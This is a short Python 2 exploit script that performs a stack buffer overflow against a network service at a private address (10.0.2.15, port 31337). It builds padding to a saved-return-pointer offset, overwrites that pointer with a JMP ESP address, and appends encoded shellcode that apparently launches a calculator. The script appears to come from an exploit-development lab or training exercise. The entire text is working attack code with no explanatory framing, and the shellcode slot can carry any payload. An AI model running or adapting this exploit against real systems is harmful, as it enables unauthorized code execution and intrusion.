#!/usr/bin/env python2
import socket
import struct

# set up the IP and port we're connecting to
RHOST = "10.0.2.15"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf_totlen = 1024
offset_srp = 146

ptr_jmp_esp = 0x080414C3

sub_esp_10 = "\x83\xec\x10"

shellcode_calc =  ""
shellcode_calc += "\xdb\xc1\xd9\x74\x24\xf4\xbf\xed\x24\x8c"
shellcode_calc += "\x8e\x5b\x29\xc9\xb1\x31\x83\xeb\xfc\x31"
shellcode_calc += "\x7b\x14\x03\x7b\xf9\xc6\x79\x72\xe9\x85"
shellcode_calc += "\x82\x8b\xe9\xe9\x0b\x6e\xd8\x29\x6f\xfa"
shellcode_calc += "\x4a\x9a\xfb\xae\x66\x51\xa9\x5a\xfd\x17"
shellcode_calc += "\x66\x6c\xb6\x92\x50\x43\x47\x8e\xa1\xc2"
shellcode_calc += "\xcb\xcd\xf5\x24\xf2\x1d\x08\x24\x33\x43"
shellcode_calc += "\xe1\x74\xec\x0f\x54\x69\x99\x5a\x65\x02"
shellcode_calc += "\xd1\x4b\xed\xf7\xa1\x6a\xdc\xa9\xba\x34"
shellcode_calc += "\xfe\x48\x6f\x4d\xb7\x52\x6c\x68\x01\xe8"
shellcode_calc += "\x46\x06\x90\x38\x97\xe7\x3f\x05\x18\x1a"
shellcode_calc += "\x41\x41\x9e\xc5\x34\xbb\xdd\x78\x4f\x78"
shellcode_calc += "\x9c\xa6\xda\x9b\x06\x2c\x7c\x40\xb7\xe1"
shellcode_calc += "\x1b\x03\xbb\x4e\x6f\x4b\xdf\x51\xbc\xe7"
shellcode_calc += "\xdb\xda\x43\x28\x6a\x98\x67\xec\x37\x7a"
shellcode_calc += "\x09\xb5\x9d\x2d\x36\xa5\x7e\x91\x92\xad"
shellcode_calc += "\x92\xc6\xae\xef\xf8\x19\x3c\x8a\x4e\x19"
shellcode_calc += "\x3e\x95\xfe\x72\x0f\x1e\x91\x05\x90\xf5"
shellcode_calc += "\xd6\xea\x72\xdc\x22\x83\x2a\xb5\x8f\xce"
shellcode_calc += "\xcc\x63\xd3\xf6\x4e\x86\xab\x0c\x4e\xe3"
shellcode_calc += "\xae\x49\xc8\x1f\xc2\xc2\xbd\x1f\x71\xe2"
shellcode_calc += "\x97\x43\x14\x70\x7b\xaa\xb3\xf0\x1e\xb2"

# build a message followed by a newline
buf = ""
buf += "A"*(offset_srp - len(buf))
buf += struct.pack("<I",ptr_jmp_esp)
buf += sub_esp_10
buf += shellcode_calc
buf += "D"*(buf_totlen - len(buf))
buf += "\n"

# send the message
s.send(buf)
